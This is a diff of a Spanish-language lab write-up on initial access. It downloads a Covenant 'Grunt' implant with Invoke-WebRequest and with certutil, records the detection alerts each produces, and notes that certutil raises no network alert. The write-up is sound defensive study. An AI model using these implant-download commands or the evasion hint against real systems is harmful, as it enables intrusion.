@@ -98,55 +98,59 @@ Para descargar el fichero utilize la expresión:
 Invoke-WebRequest -uri http://192.168.2.14:8000/GruntHTTP.exe -OutFile grunt.exe
 
 
+Se nos generan dos alertas
 
 ![image007.png](/uploads/InitialAccess/image007.png)
 
-
-Se nos generan dos alertas
-
-![image008.png](/uploads/InitialAccess/image008.png)
-
 Una primera alerta, 
-
-![image009.png](/uploads/InitialAccess/image009.png)
+![image008.png](/uploads/InitialAccess/image008.png)
 
 Y una segunda alerta,
 
-![image010.png](/uploads/InitialAccess/image010.png)
+![image009.png](/uploads/InitialAccess/image009.png)
 
 
-Tenemos otras opciones para descargar el fichero, como puede ser certutil.exe
+Tenemos otras opciones para descargar el fichero, como puede ser certutil
 
 certutil.exe -urlcache -split -f http://192.168.2.14:8000/GruntHTTP.exe grunt.exe
 
 
+![image010.png](/uploads/InitialAccess/image010.png)
+
+
+Como vemos los procesos son diferentes, a diferencia, no se llega a crear una alerta de network.
+
+
+
+Ejecución
+Se nos genera la siguiente información:
 
 ![image011.png](/uploads/InitialAccess/image011.png)
 
 
 
-Como vemos los procesos son diferentes, a diferencia, no se llega a crear una alerta de network.
 
-Ejecución
-Se nos genera la siguiente información:
 
-![image012.png](/uploads/InitialAccess/image012.png)
 
 La primera alerta, la creación de un proceso
 
-![image013.png](/uploads/InitialAccess/image013.png)
+![image012.png](/uploads/InitialAccess/image012.png)
 
 Conexión de red:
 
-![image014.png](/uploads/InitialAccess/image014.png)
+![image013.png](/uploads/InitialAccess/image013.png)
 
 QueryDNS:
 
-![image015.png](/uploads/InitialAccess/image015.png)
+![image014.png](/uploads/InitialAccess/image014.png)
 
 Conexión realiza, debería aparecernos un nuevo grunt.
 
-![image016.png](/uploads/InitialAccess/image016.png)
+![image015.png](/uploads/InitialAccess/image015.png)
+
+
+
+
 
 
 
@@ -165,5 +169,7 @@ Utilizaremos esta macro : https://raw.githubusercontent.com/christophetd/spoofin
 
 
 El primer paso, generamos la macro.
+
+![image016.png](/uploads/InitialAccess/image016.png)
 
 
